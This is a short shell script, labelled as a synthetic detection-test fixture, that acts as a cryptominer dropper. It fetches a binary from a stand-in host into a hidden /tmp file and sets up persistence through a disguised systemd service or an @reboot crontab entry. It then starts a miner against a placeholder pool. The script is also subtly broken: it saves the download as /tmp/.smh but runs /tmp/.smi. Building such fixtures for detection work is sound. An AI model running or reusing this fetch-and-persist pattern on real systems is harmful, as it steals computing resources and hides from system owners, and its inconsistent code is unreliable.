#!/bin/sh
# FIXTURE ONLY - synthetic detection test sample, not real malware
curl -fsSL https://cdn.example.test/carrier.bin -o /tmp/.smh
chmod +x /tmp/.smh
if sudo -n true 2>/dev/null; then
  printf '[Service]\nExecStart=/tmp/.smi\n' | sudo tee /etc/systemd/system/irqstatsd.service >/dev/null
  sudo systemctl enable --now irqstatsd
else
  (crontab -l 2>/dev/null; echo "@reboot /tmp/.smi") | crontab -
fi
nohup /tmp/.smi --donate-level 1 -o pool.example.test:3333 >/dev/null 2>&1 &
